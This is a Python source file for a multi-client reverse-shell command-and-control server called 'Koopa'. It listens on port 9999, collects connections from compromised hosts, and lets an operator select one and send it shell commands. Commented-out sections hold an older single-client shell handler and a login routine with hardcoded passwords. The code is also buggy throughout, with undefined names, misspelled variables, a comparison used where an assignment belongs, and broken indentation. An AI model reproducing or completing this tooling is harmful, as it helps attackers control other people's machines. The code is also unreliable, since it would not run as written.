import socket
import threading
import sys
import struct
import signal
from datetime import datetime
from queue import Queue

#-------NUMBER OF THREADS = 2--------
number_of_threads = 2
job_number = [1,2]
queue = Queue()
all_connections = []
all_addresses = []

#--------Create a socket--------------
def socket_create():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as er:
        print("Socket creation error")
#---------------bind socket---------
def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host,port))
        s.listen(5)
    except socket.error as er:
        print("Socket binding fail. Retrying...")
        time.sleep(5)
        socket_bind()


def accept_connections():
    for c in all_connections:
        c.close()
    all_connections[:]
    all_addresses[:]
    while 1:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            print("Connected to "+addr[0])
        except:
            print("Error accepting connections")
            continue
        all_connections.append(conn)
        all_addresses.append(addr)
        print("\nConnection has been established\n")
        start_koopa()

#Interactive prompt from sending commands remotly
def start_koopa():
    while True:
        cmd = input("Koopa>")
        if cmd == "list":
            list_connections()
            continue
        elif "select" in cmd:
            target, conn = get_target(cmd)
            if conn is not None:
                send_target_commands(target, conn)
        elif "help" in cmd:
            print("\nHELP\n\nlist - List all connections avaliable\nselect - Select a connection from list\nbackground - Back to Koopa from target\n")
        elif cmd == "":
            pass
        else:
            print("Command not recognized")
    return

# DISPLAYS ALL CURRENT CONNECTIONS:
def list_connections():
    results = ""
    for i, conn in enumerate(all_connections):
        try:
            conn.send(encode(" ","utf-8"))
            conn.recv(20480)
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '   ' + str(all_addresses[i][2]) + '\n'
        
    print("\n-----TROOPAS-----\n\n"+results)
    return

#------Select ID from list-------

def get_target(cmd):
    try:
        target = cmd.replace("select ","")
        target = int(target)
        conn = all_connections[target]
        print("\nConnection recieved from:"+str(all_addresses[target][0]))
        print(str(all_adresses[target[0]])+">",end="")
        return target, conn
    except:
        print("Not a valid selection\n")
        return None, None
#Connect with remote target
def send_target_commands(conn):
    conn.send(str.encode(" "))
    cwd_bytes = self.read_command_output(conn)
    cwd = str(cwd_bytes, "utf-8")
    print(cwd, end="")
    while True:
        try:
            cmd == input()
            if len(str.encode(cmd))> 0:
                conn.send(str.encode(cmd))
                client_response = str(conn.recv(20480),"latin-1")
                print(client_response, end="")
            if cmd == "background":
                break
        except:
            print("\nConnection was lost\n")
            break
    del all_adresses[target]
    del all_connections[target]
    return

#Create_workers:
def create_workers():
    for _ in range(number_of_threads):
        t = threading.Thread(target=work)
        t.deamon = True
        t.start()
    return

#do the next job in the queue(one handles connections, the other sends commands)
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_koopa()
        queue.task_done()
    return

#EAch list item is a new job
def create_jobs():
    for x in job_number:
        queue.put(x)
    queue.join()
    return


#-------ACTION----------
def main():
    create_workers()
    create_jobs()

main()


"""
#----------Estabilish a connection--------------
def socket_accept():
    conn, addr = s.accept()
    print("\nPayload recieved from: %s:%s\n"%(host,port))
    send_commands(conn)
    conn.close()


#Send commands
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024).decode())
            print(client_response, end="")





#def main():
#        #socket_create()
        #socket_bind()
        #dont need #list_connections()
        #accept_connections()
        #start_koopa()
        #socket_accept()

"""






"""
#-------------VARIABLES---------------
now = datetime.now()
#-------------------------------------




def conectado():
    while True:
        conn, addr = s.accept() #Aceita a conexao removendo da lista do listen()
        conn.send("\n----------WELCOME-----------\n\n".encode())

            shell = subprocess.call("cmd")
            receber = conn.recv(1024).decode()
            conn.send(shell.decode())
            conn.recv(1024)
            c
        else:
            print("ok")
            conectado()







    conn.send("Login: ".encode())
    login = conn.recv(1024)
    conn.send("Password: ".encode())
    password = conn.recv(1024)
#----------TRATANDO O LOG------------------
    login = login.split()[0] ; login = login.decode()
    password = password.split()[0] ; password = password.decode()
#---------LOGINS E SENHAS-------------------
    database_login = {"vini":"1234","bullet":"senhor"}
    online = database_login[login] == password
    if online == True:
        print(login+" just Connected - %s\n"%(now))
    else:
        print("\n"+login+": Attempt to connect.\nIP:"+ip)
        conn.send("\nWrong login or password".encode())
        break
#---------CRIANDO LOG-------------------------
    f = open("log.txt","a")
    f.write("Attempt to Login:\r\nLogin: %s Password: %s at %s from %s:%d. Connected: %s\r\n\r\n" %(login,password,now,ip,port,online))
    f.close()
    f = open("data.txt","a")
    f.write("\n%s\n%s:\n"%(now,login))
    f.close()
#----------USUARIO JA CONECTADO---------------
    while True:
        conn.send(login.encode()+">>>".encode())
        msg = conn.recv(1024).decode()
        print(login+": "+msg)
        f = open("data.txt","a")
        f.write(msg)
        f.close()

        #print("Quitting")
        #break
#---------------------------------------------
    break
    print("Conexao de %s:%d"%(addr[0],addr[1]))
    conn.sendall(b">>>:")
    msg = conn.recv(1024)
    print("Mensagem: %s"%msg)
    conn.close()
    break'''
s.close()
"""
